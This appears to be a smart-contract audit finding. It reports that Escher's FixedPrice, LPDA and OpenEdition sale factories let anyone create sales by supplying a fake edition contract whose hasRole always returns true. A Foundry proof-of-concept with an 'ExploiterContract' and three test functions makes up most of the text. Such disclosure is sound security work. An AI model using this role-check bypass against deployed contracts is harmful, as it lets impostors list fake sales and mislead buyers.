# Vulnerability details

## Impact
Anyone can create an open edition, fixed price, or LDSA sale without being a creator.  The msg.sender only needs to provide a create a contract that returns true when hasRole(bytes32, address) is queried. 

Considering that no contract keeps track of active sales, sales are likely being tracked through events.  This means anyone could feign an Escher721 sale on Escher's frontend depending on the implementation.

## Proof of Concept
1. Create a contract that contains an external function, hasRole(bytes32, address), that always returns true 
2. Call createFixedSale( ), createLPDASale( ), or createOpenEdition( ) from FixedPriceFactory, LPDAFactory, or OpenEditionFactory, respectively, with a valid sale and the aforementioned contract as the sale's edition

       import "forge-std/Test.sol";
       import {LPDAFactory, LPDA} from "src/minters/LPDAFactory.sol";
       import {OpenEditionFactory, OpenEdition} from "src/minters/OpenEditionFactory.sol";
       import {FixedPriceFactory, FixedPrice} from "src/minters/FixedPriceFactory.sol";

        contract ExploiterContract {
            function hasRole(bytes32, address) external view returns(bool) {
                return true;
            }
        }

        contract CreateSaleBugs is Test {
        function testCreateInvalidFixedPriceSale() public {

            FixedPriceFactory _factory = new FixedPriceFactory();
            address _exploiter = address(new ExploiterContract());

            FixedPrice.Sale memory _validSale = FixedPrice.Sale({
                currentId: uint48(0),
                finalId: uint48(1),
                edition: _exploiter,
                price: uint96(0),
                saleReceiver: payable(address(1)),
                startTime: uint96(block.timestamp)
            });

            _factory.createFixedSale(_validSale);
        }

        function testCreateInvalidLPDASale() public {

        LPDAFactory _factory = new LPDAFactory();
        address _exploiter = address(new ExploiterContract());

        LPDA.Sale memory _validSale = LPDA.Sale({
            currentId: uint48(0),
            finalId: uint48(1),
            edition: _exploiter,
            startPrice: uint80(1 ether),
            finalPrice: uint80(0),
            dropPerSecond: 1,
            startTime: uint96(block.timestamp),
            saleReceiver: payable(address(1)),
            endTime: uint96(block.timestamp + 1 days)
        });

        _factory.createLPDASale(_validSale);
       }

        function testCreateInvalidOpenEditionSale() public {

        OpenEditionFactory _factory = new OpenEditionFactory();
        address _exploiter = address(new ExploiterContract());

        OpenEdition.Sale memory _validSale = OpenEdition.Sale({
            price: uint72(0),
            currentId: uint24(1),
            edition: _exploiter,
            startTime: uint96(block.timestamp),
            saleReceiver: payable(address(1)),
            endTime: uint96(block.timestamp + 1 days)
        });

        _factory.createOpenEdition(_validSale);
        }
        }

